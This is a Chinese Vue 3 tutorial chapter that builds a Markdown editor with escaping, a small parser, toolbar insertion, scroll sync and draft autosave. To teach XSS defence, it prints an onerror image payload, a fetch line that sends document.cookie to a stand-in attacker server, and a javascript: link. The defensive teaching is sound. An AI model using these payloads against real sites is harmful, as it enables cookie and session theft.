# 案例 05 · Markdown 编辑器

## 需求：活动组织者要写活动详情

后台的活动发布页里，“活动详情”这一栏如果只是一个普通多行文本框，组织者写出来的内容
就会是一大段没有格式的文字，在前台展示页里既不好读，也不好看。

所以需要一个 Markdown 编辑器：

| 编号 | 需求 | 说明 |
| --- | --- | --- |
| 1 | 左侧输入、右侧实时预览 | 边写边看到最终效果 |
| 2 | 支持常用语法 | 标题、粗体、斜体、列表、链接、代码块 |
| 3 | 工具栏 | 点按钮在**光标处**插入语法 |
| 4 | 滚动同步 | 左侧滚到哪，右侧大致跟到哪 |
| 5 | 字数统计 | 实时显示字数 |
| 6 | 草稿自动保存 | 刷新页面草稿还在 |

这个案例是进阶内容，**建议先自己动手写一版，再对照本文的完整代码**。它把本单元学到的东西
全用上了一遍：事件处理、表单绑定、生命周期、副作用清理。

::: warning 这个案例里有两个坑，比功能本身更重要
1. **`v-html` 的安全边界** —— 用户写的内容直接渲染，可以被注入脚本。
2. **在光标处插入文本** —— 必须用 `selectionStart` 与 `selectionEnd`，不能只改字符串。

这两件事在真实项目里出问题，后果比“界面不好看”严重得多。本文会把它们单独讲清楚。
:::

## 整体结构

组件只有一个，但内部分成三层：**工具函数、渲染组件、状态清理**。

```text [数据流]
       用户输入
          │
          ▼
   ┌─────────────────┐
   │  content (ref)  │  ← 唯一的响应式数据源
   └────────┬────────┘
            │
     ┌──────┴───────┐
     ▼              ▼
┌─────────┐   ┌──────────────────────────┐
│ textarea│   │ computed: renderedHtml    │
│  v-model│   │  escapeHtml → renderMd    │
└─────────┘   └────────────┬─────────────┘
                           │ v-html
                           ▼
                    ┌──────────────┐
                    │ 预览区 <div>  │
                    └──────────────┘

旁路：watch(content) → 防抖 800ms → localStorage（草稿）
```

文件组织：

```text [src 目录]
src/
├── components/
│   └── MarkdownEditor.vue     ← 编辑器组件（本案例主体）
├── utils/
│   └── markdown.js            ← 转义与解析函数（可单独测试）
└── views/
    └── ActivityEditView.vue   ← 使用编辑器的页面
```

## 第一件事：转义，然后才是解析

### 为什么不能直接把用户输入塞进 `v-html`

`v-html` 的作用是“把字符串当作 HTML 渲染”。这很方便，也很危险。

假设组织者在活动详情里写了这么一段：

```html [用户在输入框里写的内容]
<img src="x" onerror="alert(document.cookie)" />
```

如果你直接 `v-html="content"`，浏览器会把它当一个正常的 `<img>` 解析。
图片加载失败时触发 `onerror`，里面的 JavaScript 就被执行了。攻击者可以改成
`fetch('https://坏人的服务器/?cookie=' + document.cookie)`，把当前登录态发走。

**这不是“用户乱写”，这是真实的攻击方式。** 只要有一个用户可以输入、另一个用户会看到的字段，
就必须处理这件事。

::: danger 只要用了 `v-html`，就必须先做转义
```vue [✗ 危险写法]
<div v-html="content"></div>
```

```js [✓ 安全写法：先转义，再解析]
import { escapeHtml, renderMarkdown } from '@/utils/markdown'

const renderedHtml = computed(() => renderMarkdown(content.value))
// renderMarkdown 内部第一步就是 escapeHtml
```
:::

### 转义函数

转义的思路是：把可能被浏览器当成标签或属性含义的字符，替换成它们的“实体写法”。

```js [src/utils/markdown.js]
// 把有特殊含义的字符替换成实体，让它们以“纯文本”的形式显示
export function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;') // 必须第一个替换，否则会把后面替换出来的 & 又转一遍
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}
```

替换之后，`<img src="x" onerror="...">` 变成
`&lt;img src=&quot;x&quot; onerror=&quot;...&quot;&gt;`。浏览器会把这一串当作文字显示，
不会当标签解析。

::: tip 为什么 `&` 必须第一个替换
如果先替换 `<` 得到 `&lt;`，之后再替换 `&`，`&lt;` 里的 `&` 会被替换成 `&amp;`，
结果变成 `&amp;lt;`，页面显示的就是 `&lt;` 这五个字符，而不是 `<`。

**顺序是：`&` → `<` → `>` → `"` → `'`。**
:::

## 写一个够用的 Markdown 解析器

真实的 Markdown 规范很复杂。但我们的需求只有六种语法，**自己写一个两百行以内的解析器完全够用**，
而且过程透明，出了问题能自己改。

### 解析策略：先按行扫，再处理行内

```js [src/utils/markdown.js]
import { escapeHtml } from './markdown'

// 行内语法：处理一行文字内部的标记
function inline(text) {
  return (
    text
      // 行内代码：`code`
      .replace(/`([^`]+)`/g, '<code>$1</code>')
      // 粗体：**text**
      .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
      // 斜体：*text*
      .replace(/\*([^*]+)\*/g, '<em>$1</em>')
      // 链接：[文字](https://地址)，只允许 http 与 https 协议
      .replace(
        /\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g,
        '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>'
      )
  )
}
```

::: warning 链接为什么只允许 `http` 与 `https`
如果允许任意协议，`[点我](javascript:alert(1))` 就会被解析成一个可点击的链接，
用户一点就执行脚本。**只放行明确安全的协议**，这是链接处理的基本规则。

`rel="noopener noreferrer"` 是为了防止新打开的页面通过 `window.opener` 操作原页面。
:::

### 主流程：逐行判断

```js [src/utils/markdown.js]
export function renderMarkdown(source) {
  // 第一步：整体转义，之后所有处理都基于“已经安全”的文本
  const safe = escapeHtml(source)
  const lines = safe.split('\n')
  const out = []

  let inCodeBlock = false
  let codeBuffer = []
  let listType = null // 记录当前在 ul 里还是 ol 里

  function closeList() {
    if (listType) {
      out.push(`</${listType}>`)
      listType = null
    }
  }

  for (const line of lines) {
    // 1. 代码块围栏：以三个反引号开头
    if (line.trim().startsWith('```')) {
      if (inCodeBlock) {
        out.push(`<pre><code>${codeBuffer.join('\n')}</code></pre>`)
        codeBuffer = []
        inCodeBlock = false
      } else {
        closeList()
        inCodeBlock = true
      }
      continue
    }
    // 代码块内部的内容原样保留，不再解析
    if (inCodeBlock) {
      codeBuffer.push(line)
      continue
    }

    // 2. 标题：# 到 ######
    const heading = /^(#{1,6})\s+(.*)$/.exec(line)
    if (heading) {
      closeList()
      const level = heading[1].length
      out.push(`<h${level}>${inline(heading[2])}</h${level}>`)
      continue
    }

    // 3. 无序列表：- 或 *
    if (/^\s*[-*]\s+/.test(line)) {
      if (listType !== 'ul') {
        closeList()
        out.push('<ul>')
        listType = 'ul'
      }
      out.push(`<li>${inline(line.replace(/^\s*[-*]\s+/, ''))}</li>`)
      continue
    }

    // 4. 有序列表：1. 2. 3.
    if (/^\s*\d+\.\s+/.test(line)) {
      if (listType !== 'ol') {
        closeList()
        out.push('<ol>')
        listType = 'ol'
      }
      out.push(`<li>${inline(line.replace(/^\s*\d+\.\s+/, ''))}</li>`)
      continue
    }

    // 5. 空行：结束当前列表
    if (line.trim() === '') {
      closeList()
      continue
    }

    // 6. 其他情况：当作段落
    closeList()
    out.push(`<p>${inline(line)}</p>`)
  }

  // 收尾：处理没闭合的代码块与列表
  if (inCodeBlock) {
    out.push(`<pre><code>${codeBuffer.join('\n')}</code></pre>`)
  }
  closeList()

  return out.join('\n')
}
```

注意两个设计选择：

1. **先整体转义，再解析。** 这样解析器处理的一定是安全文本，
   后面无论怎么拼字符串都不会引入可执行的 HTML。
2. **用 `line.trim().startsWith` 判断围栏，不用正则。** 正则里写围栏符号很容易把自己绕进去，
   代码也难读。

## 工具栏：在光标处插入语法

### 只改字符串是不够的

最容易想到的实现是“在内容末尾追加”：

```vue [✗ 错误示范]
function insertBold() {
  content.value += '**粗体**'
}
```

问题很明显：用户已经把光标放在标题中间了，你却在末尾追加，他还要自己剪切再粘贴。
**正确做法是往光标位置插入。**

### 光标位置在哪里

原生 `<textarea>` 元素上有两个属性：

| 属性 | 含义 |
| --- | --- |
| `el.selectionStart` | 选中区域的起始索引（一个字符没选时就是光标位置） |
| `el.selectionEnd` | 选中区域的结束索引 |

还有两个方法：

| 方法 | 作用 |
| --- | --- |
| `el.setSelectionRange(start, end)` | 设置选中区域，`start === end` 时就是设置光标位置 |
| `el.focus()` | 让元素重新获得焦点 |

### 完整实现

```js [src/components/MarkdownEditor.vue（工具栏部分）]
import { ref, nextTick, useTemplateRef } from 'vue'

const content = ref('')
const textareaEl = useTemplateRef('textareaRef')

// 每种语法需要的前缀、后缀、占位文字
const syntaxMap = {
  bold: { before: '**', after: '**', placeholder: '粗体文字' },
  italic: { before: '*', after: '*', placeholder: '斜体文字' },
  h2: { before: '## ', after: '', placeholder: '小标题' },
  ul: { before: '- ', after: '', placeholder: '列表项' },
  link: { before: '[', after: '](https://)', placeholder: '链接文字' },
  code: { before: '```\n', after: '\n```', placeholder: '代码' }
}

function insertSyntax(type) {
  const el = textareaEl.value
  if (!el) return

  const syntax = syntaxMap[type]
  if (!syntax) return

  // 第 1 步：记录光标位置与被选中的内容
  const start = el.selectionStart
  const end = el.selectionEnd
  const text = content.value
  const selected = text.slice(start, end)

  // 第 2 步：决定插入什么
  // 有选中内容 → 用选中内容包裹；没有 → 插入占位文字，并把它选中
  const inner = selected || syntax.placeholder
  const inserted = syntax.before + inner + syntax.after

  // 第 3 步：拼回完整内容
  content.value = text.slice(0, start) + inserted + text.slice(end)

  // 第 4 步：等 DOM 更新后再设置光标
  // textarea 的 value 是异步更新的，不等 nextTick 会设置到错误的位置
  nextTick(() => {
    el.focus()
    if (selected) {
      // 有选中内容：光标放到插入内容之后
      const pos = start + inserted.length
      el.setSelectionRange(pos, pos)
    } else {
      // 没有选中内容：选中刚插入的占位文字，方便直接输入替换
      const innerStart = start + syntax.before.length
      el.setSelectionRange(innerStart, innerStart + inner.length)
    }
  })
}
```

这段实现里有三个关键点，缺一个体验就会差：

| 关键点 | 不做会怎样 |
| --- | --- |
| 用 `selectionStart` / `selectionEnd` 定位 | 只能追加到末尾 |
| 区分“有选中内容”与“没选中” | 没选中时插入一个空的 `****`，用户还得自己点进去打字 |
| `nextTick` 之后再 `focus` + `setSelectionRange` | 光标跳到末尾或丢失焦点 |

::: warning 为什么必须 `nextTick`
`content.value = ...` 之后，Vue 会安排一次 DOM 更新，**它是异步的**。
如果你紧接着就调用 `el.setSelectionRange()`，此刻 `el.value` 还是旧内容，
长度对不上，浏览器会把光标钳到末尾。

`nextTick` 的回调在所有 DOM 更新完成之后执行，这时 `el.value` 才和 `content.value` 一致。
:::

## 实时预览

预览区要做两件事：把内容渲染成 HTML、让滚动跟着左侧走。

```vue [src/components/MarkdownEditor.vue（预览部分）]
<script setup>
import { computed } from 'vue'
import { renderMarkdown } from '@/utils/markdown'

const content = ref('')

// ✓ 用 computed：content 变化时自动重算，不需要手动 watch
const renderedHtml = computed(() => renderMarkdown(content.value))
</script>

<template>
  <div class="editor">
    <textarea ref="textareaRef" v-model="content" @scroll="syncScroll"></textarea>
    <!-- ✓ 内容已在 renderMarkdown 里转义过 -->
    <div ref="previewRef" class="preview" v-html="renderedHtml"></div>
  </div>
</template>
```

::: tip 用 `computed` 而不是 `watch + 手动赋值`
`computed` 有三个好处：**有缓存**（内容没变就不会重复解析）、**不用手动同步**、
**依赖关系清晰**（一看就知道它由 `content` 算出来）。

“把 A 算成 B 显示出来”这类需求，默认就用 `computed`。
:::

### 滚动同步

两侧内容行数不同，高度也不一样，不可能做到逐行对齐。实用做法是**按比例映射**：

```js [src/components/MarkdownEditor.vue（滚动同步）]
import { useTemplateRef } from 'vue'

const textareaEl = useTemplateRef('textareaRef')
const previewRef = useTemplateRef('previewRef')

function syncScroll() {
  const src = textareaEl.value
  const dest = previewRef.value
  if (!src || !dest) return

  // 左侧还能滚动的距离（总高度 - 可视高度）
  const srcMax = src.scrollHeight - src.clientHeight
  if (srcMax <= 0) return

  // 当前滚动进度（0 到 1）
  const ratio = src.scrollTop / srcMax

  // 按同样的进度设置右侧
  const destMax = dest.scrollHeight - dest.clientHeight
  dest.scrollTop = ratio * destMax
}
```

::: warning 除零是这里最容易出的问题
内容很短时，`src.scrollHeight - src.clientHeight` 是 `0`，`scrollTop / 0` 得到 `NaN`，
`scrollTop` 被设成 `NaN` 后行为不可预期。**所以必须先判断 `srcMax <= 0` 再计算。**

写任何“按比例换算”的代码，都要先问一句：**分母会不会是 0？**
:::

反向同步（滚右侧带动左侧）原理一样，把两个元素对调即可。这里只做单向，
因为用户的操作主要集中在左侧输入区。

## 字数统计

```js [src/components/MarkdownEditor.vue（字数统计）]
import { computed } from 'vue'

const stats = computed(() => {
  const raw = content.value
  // 去掉所有空白字符后的字符数
  const chars = raw.replace(/\s/g, '').length
  // 英文单词数（连续的字母数字算一个词）
  const words = (raw.match(/[A-Za-z0-9]+/g) || []).length
  const lines = raw === '' ? 0 : raw.split('\n').length
  return { chars, words, lines }
})
```

```vue [src/components/MarkdownEditor.vue（统计显示）]
<template>
  <div class="editor-footer">
    <span>{{ stats.chars }} 字符</span>
    <span>{{ stats.words }} 词</span>
    <span>{{ stats.lines }} 行</span>
  </div>
</template>
```

::: tip 中文字数怎么算
中文里“字数”一般指字符数，所以上面用“去掉空白后的字符长度”。
英文内容用“字符数”会虚高（一个单词好几个字符），所以额外给一个词数。

**不用追求精确**。给用户一个数量级的感觉就够了，纠结“标点算不算字数”意义不大。
:::

## 草稿自动保存

需求是“刷新页面后草稿还在”。用 `localStorage` 加防抖实现。

```js [src/components/MarkdownEditor.vue（草稿）]
import { ref, watch, onMounted, onUnmounted } from 'vue'

const STORAGE_KEY = 'activity-detail-draft'
const content = ref('')
let saveTimer = null

// 读取草稿
onMounted(() => {
  const saved = localStorage.getItem(STORAGE_KEY)
  if (saved) {
    content.value = saved
  }
})

// 内容变化 800 毫秒后保存一次，避免每敲一个字就写一次 localStorage
watch(content, (val) => {
  clearTimeout(saveTimer)
  saveTimer = setTimeout(() => {
    localStorage.setItem(STORAGE_KEY, val)
  }, 800)
})

// ✓ 组件卸载时把还没执行的保存定时器清掉
onUnmounted(() => {
  clearTimeout(saveTimer)
})

function clearDraft() {
  localStorage.removeItem(STORAGE_KEY)
  content.value = ''
}
```

::: warning 两个必须处理的细节
1. **防抖**：`localStorage` 是同步操作，每敲一个字就写一次会造成输入卡顿。
   用 800 毫秒的防抖，用户停手时才写。
2. **清理定时器**：`onUnmounted` 里不 `clearTimeout`，组件卸载后定时器仍会执行一次，
   可能把新页面的草稿又覆盖回去。

另外，`localStorage` 里的内容**下次读取时同样是不可信输入**，所以预览仍然走
`renderMarkdown` 的转义流程 —— 不要因为“是我自己存的”就跳过转义。
:::

## 完整代码

把上面各部分拼起来，就是一个可以直接用的组件。

```vue [src/components/MarkdownEditor.vue]
<script setup>
import { ref, computed, watch, nextTick, onMounted, onUnmounted, useTemplateRef } from 'vue'
import { renderMarkdown } from '@/utils/markdown'

const props = defineProps({
  modelValue: { type: String, default: '' },
  placeholder: { type: String, default: '在这里写活动详情……' }
})
const emit = defineEmits(['update:modelValue'])

const STORAGE_KEY = 'activity-detail-draft'

const content = computed({
  get: () => props.modelValue,
  set: (val) => emit('update:modelValue', val)
})

const textareaEl = useTemplateRef('textareaRef')
const previewRef = useTemplateRef('previewRef')

let saveTimer = null

const renderedHtml = computed(() => renderMarkdown(content.value))

const stats = computed(() => {
  const raw = content.value
  const chars = raw.replace(/\s/g, '').length
  const words = (raw.match(/[A-Za-z0-9]+/g) || []).length
  const lines = raw === '' ? 0 : raw.split('\n').length
  return { chars, words, lines }
})

const tools = [
  { type: 'h2', label: 'H2', title: '二级标题' },
  { type: 'bold', label: 'B', title: '粗体' },
  { type: 'italic', label: 'I', title: '斜体' },
  { type: 'ul', label: '≡', title: '无序列表' },
  { type: 'link', label: '🔗', title: '链接' },
  { type: 'code', label: '</>', title: '代码块' }
]

const syntaxMap = {
  bold: { before: '**', after: '**', placeholder: '粗体文字' },
  italic: { before: '*', after: '*', placeholder: '斜体文字' },
  h2: { before: '## ', after: '', placeholder: '小标题' },
  ul: { before: '- ', after: '', placeholder: '列表项' },
  link: { before: '[', after: '](https://)', placeholder: '链接文字' },
  code: { before: '```\n', after: '\n```', placeholder: '代码' }
}

function insertSyntax(type) {
  const el = textareaEl.value
  const syntax = syntaxMap[type]
  if (!el || !syntax) return

  const start = el.selectionStart
  const end = el.selectionEnd
  const text = content.value
  const selected = text.slice(start, end)

  const inner = selected || syntax.placeholder
  const inserted = syntax.before + inner + syntax.after

  content.value = text.slice(0, start) + inserted + text.slice(end)

  nextTick(() => {
    el.focus()
    if (selected) {
      const pos = start + inserted.length
      el.setSelectionRange(pos, pos)
    } else {
      const innerStart = start + syntax.before.length
      el.setSelectionRange(innerStart, innerStart + inner.length)
    }
  })
}

function handleTab(e) {
  // 在输入框里按 Tab，插入两个空格，而不是跳走
  e.preventDefault()
  const el = textareaEl.value
  const start = el.selectionStart
  const end = el.selectionEnd
  content.value = content.value.slice(0, start) + '  ' + content.value.slice(end)
  nextTick(() => el.setSelectionRange(start + 2, start + 2))
}

function syncScroll() {
  const src = textareaEl.value
  const dest = previewRef.value
  if (!src || !dest) return
  const srcMax = src.scrollHeight - src.clientHeight
  if (srcMax <= 0) return
  const ratio = src.scrollTop / srcMax
  dest.scrollTop = ratio * (dest.scrollHeight - dest.clientHeight)
}

function loadDraft() {
  const saved = localStorage.getItem(STORAGE_KEY)
  if (saved && !content.value) content.value = saved
}

function clearDraft() {
  localStorage.removeItem(STORAGE_KEY)
  content.value = ''
}

watch(content, (val) => {
  clearTimeout(saveTimer)
  saveTimer = setTimeout(() => localStorage.setItem(STORAGE_KEY, val), 800)
})

onMounted(loadDraft)
onUnmounted(() => clearTimeout(saveTimer))
</script>

<template>
  <div class="md-editor">
    <!-- 工具栏 -->
    <div class="md-toolbar">
      <button
        v-for="tool in tools"
        :key="tool.type"
        type="button"
        :title="tool.title"
        @click="insertSyntax(tool.type)"
      >
        {{ tool.label }}
      </button>
      <span class="spacer"></span>
      <button type="button" @click="clearDraft">清空草稿</button>
    </div>

    <!-- 编辑区 + 预览区 -->
    <div class="md-body">
      <textarea
        ref="textareaRef"
        v-model="content"
        :placeholder="placeholder"
        @scroll="syncScroll"
        @keydown.tab="handleTab"
      ></textarea>

      <!-- 内容已在 renderMarkdown 中转义过，可以安全渲染 -->
      <div ref="previewRef" class="md-preview" v-html="renderedHtml"></div>
    </div>

    <!-- 统计 -->
    <div class="md-footer">
      <span>{{ stats.chars }} 字符</span>
      <span>{{ stats.words }} 词</span>
      <span>{{ stats.lines }} 行</span>
    </div>
  </div>
</template>

<style scoped>
.md-editor {
  border: 1px solid #dcdfe6;
  border-radius: 6px;
  overflow: hidden;
}

.md-toolbar {
  display: flex;
  align-items: center;
  gap: 4px;
  padding: 8px;
  background: #f5f7fa;
  border-bottom: 1px solid #dcdfe6;
}

.md-toolbar .spacer {
  flex: 1;
}

.md-body {
  display: grid;
  grid-template-columns: 1fr 1fr;
  min-height: 360px;
}

.md-body textarea,
.md-preview {
  padding: 12px;
  font-size: 14px;
  line-height: 1.7;
  overflow-y: auto;
  border: none;
  outline: none;
  resize: none;
  min-height: 360px;
}

.md-preview {
  border-left: 1px solid #dcdfe6;
  background: #fafafa;
}

.md-footer {
  display: flex;
  gap: 16px;
  padding: 6px 12px;
  font-size: 12px;
  color: #909399;
  border-top: 1px solid #dcdfe6;
}
</style>
```

在页面里这样用：

```vue [src/views/ActivityEditView.vue]
<script setup>
import { ref } from 'vue'
import MarkdownEditor from '@/components/MarkdownEditor.vue'

const detail = ref('')
</script>

<template>
  <MarkdownEditor v-model="detail" placeholder="写下活动的流程与注意事项" />
</template>
```

## 小结

- `v-html` 渲染用户输入**必须先转义**：把 `&`、`<`、`>`、`"`、`'` 换成实体，
  **`&` 要第一个换**。
- Markdown 链接只放行 `http` 与 `https` 协议，防住 `javascript:` 这类地址。
- 解析器采用**先按行扫、再处理行内**的两层结构，先整体转义再解析，全程不拼未转义的内容。
- 插入语法要用 `selectionStart` / `selectionEnd` 定位，**区分有没有选中内容**，
  并在 `nextTick` 之后再 `focus` 与 `setSelectionRange`。
- 预览用 `computed` 生成 HTML；滚动同步按比例映射，**先判断分母大于 0**。
- 草稿用防抖写入 `localStorage`，`onUnmounted` 里清掉定时器；**草稿内容下次读取时仍要转义**。

## 常见坑

::: details 坑 1：`v-html` 渲染之后样式不生效
**现象**：`<style scoped>` 里给 `h2`、`code` 写了样式，预览区没反应。

**原因**：`<style scoped>` 会给选择器加上当前组件的属性选择器，而 `v-html` 插入的内容
是运行时生成的，**不会带上这个属性**。

**处理**：用 `:deep()` 穿透：

```vue
<style scoped>
.md-preview :deep(h2) {
  font-size: 20px;
  margin: 16px 0 8px;
}
.md-preview :deep(code) {
  background: #f0f2f5;
  padding: 2px 4px;
  border-radius: 3px;
}
</style>
```

`scoped` 的原理会在[单元 7](/unit07/01-sfc)详细讲。
:::

::: details 坑 2：插入语法后光标跳到了末尾
**现象**：点“粗体”，`****` 插到了正确位置，但光标跑到了全文最后。

**原因**：`setSelectionRange` 在 DOM 更新前调用了，或者 `el.focus()` 在
`setSelectionRange` 之后调用（某些浏览器里 `focus` 会把光标重置到末尾）。

**处理**：放进 `nextTick`，**先 `focus()` 再 `setSelectionRange()`**，顺序不要反。
:::

::: details 坑 3：中文输入法打字时预览闪烁
**现象**：用拼音输入法打字，还没选字，预览区就出现了一串拼音。

**原因**：输入法组合期间 `input` 事件持续触发，`v-model` 每次都同步，预览跟着重算。

**处理**：两种做法。一是加组合状态判断：

```js
const composing = ref(false)
// 模板里：@compositionstart="composing = true" @compositionend="composing = false"
```

二是用 `setTimeout` 把预览更新延后一小段（约 100 毫秒）并合并多次触发。
**这个坑在本地化项目里几乎必然遇到**，值得早点知道。
:::

::: details 坑 4：草稿把别人的内容覆盖了
**现象**：两个人用同一台电脑，第一个人写的草稿出现在第二个人打开编辑器的输入框里。

**原因**：`localStorage` 的键是固定的字符串，同一浏览器下所有用户共用。

**处理**：把键和用户（或这条活动）绑定，例如 `activity-detail-draft-${activityId}`。
**草稿键必须带业务标识**，不要用全局唯一的一个键。
:::

::: details 坑 5：列表嵌套没生效
**现象**：写了缩进的列表项，预览出来还是同一级。

**原因**：本文的解析器只支持**单层列表**，不处理缩进层级。

**处理**：先确认需求。真要支持嵌套，需要维护一个层级栈，复杂度会明显上升。
**这时候应该考虑引入成熟的解析库**（比如 `marked`），而不是继续手写。
本文手写解析器的价值在于“理解过程”，生产项目里用现成库更省事。
:::

## 课后练习

::: details 练习 1：加一个“引用块”语法
需求：以 `> ` 开头的行渲染成 `<blockquote>`，连续多行引用合并成一个引用块。

**参考思路**：仿照列表的处理方式 —— 用一个变量记“当前是否在引用块里”，
进入时插入 `<blockquote>`，遇到非引用行或空行时关闭。注意也要在 `closeList()` 那样
统一的收尾位置处理未闭合的情况。

:::

::: details 练习 2：让工具栏按钮显示“已应用的样式”
需求：光标落在粗体文字里时，“B”按钮显示为激活状态。

**参考思路**：需要从 `selectionStart` 往前找最近的 `**`，判断有没有成对。
在 `@click`、`@keyup`、`@select` 时都重新计算一次。
提示：`el.selectionStart` 是只读的，需要用一个 `ref` 同步它的值。

:::

::: details 练习 3：把草稿保存改成“可撤销清空”
需求：点“清空草稿”前弹一个确认；清空后提供一个“撤销”按钮，能把刚才的内容恢复回来。

**参考思路**：清空前把内容存进一个临时变量（或者 `sessionStorage`），
撤销时写回去。**注意“撤销”只在本次会话内有效**，所以不要存进 `localStorage`。
这个思路和[案例 08 画板的撤销重做](/unit08/07-case-canvas)是同一条线。
:::

::: details 练习 4：给预览区加一个“目录”
需求：把内容里所有 `##` 标题提取出来，在预览区右侧显示一个可点击的目录，点击跳转到对应位置。

**参考思路**：解析时给每个标题生成一个 `id`（可以用标题文字加序号），
同时收集成数组。预览区渲染时用 `<a :href="'#' + id">` 跳转。
注意标题文字里可能有空格和中文，`id` 要做一次转写。

:::

---

上一节：[6.5 生命周期与副作用清理](/unit06/05-lifecycle) ·
下一节：[单元 6 课后练习](/unit06/practice)
